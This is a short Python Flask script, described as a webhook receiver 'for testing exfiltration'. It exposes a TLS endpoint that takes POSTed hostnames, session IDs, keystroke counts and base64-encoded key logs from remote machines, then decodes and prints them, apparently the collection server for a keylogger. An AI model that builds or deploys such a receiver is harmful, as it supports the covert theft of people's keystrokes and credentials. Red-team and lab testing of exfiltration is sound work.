#!/usr/bin/env python3
"""Simple Flask webhook receiver for testing exfiltration."""
from flask import Flask, request, jsonify
import base64

app = Flask(__name__)

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    print(f"\n[+] Received from: {data.get('hostname')}")
    print(f"[+] Session: {data.get('session_id')}")
    print(f"[+] Keys captured: {data.get('key_count')}")
    
    if data.get('data'):
        decoded = base64.b64decode(data['data']).decode('utf-8', errors='ignore')
        print(f"[+] Log preview:\n{decoded[:500]}")
    
    return jsonify({"status": "ok"}), 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, ssl_context='adhoc')